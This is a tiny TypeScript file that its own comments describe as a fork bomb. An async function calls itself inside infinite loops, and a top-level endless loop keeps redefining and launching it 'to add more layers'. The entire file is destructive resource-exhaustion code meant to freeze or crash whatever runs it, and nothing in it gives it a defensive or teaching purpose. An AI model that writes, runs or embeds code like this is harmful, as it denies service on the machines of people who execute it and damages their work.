export{}

//initialize as undefined variable
var foo:any = undefined;
//asign basic fork bomb fn to it
foo = async (bar:any) => {
  while (true) (async () => bar(foo))();
}

//infinitely loop
while (true) {
  //reassign function to add more layers
  foo = async (bar:any) => {
    while (true) (async () => bar(foo))();
  }
  //call asyncronously
  (async () => foo(foo))();
}
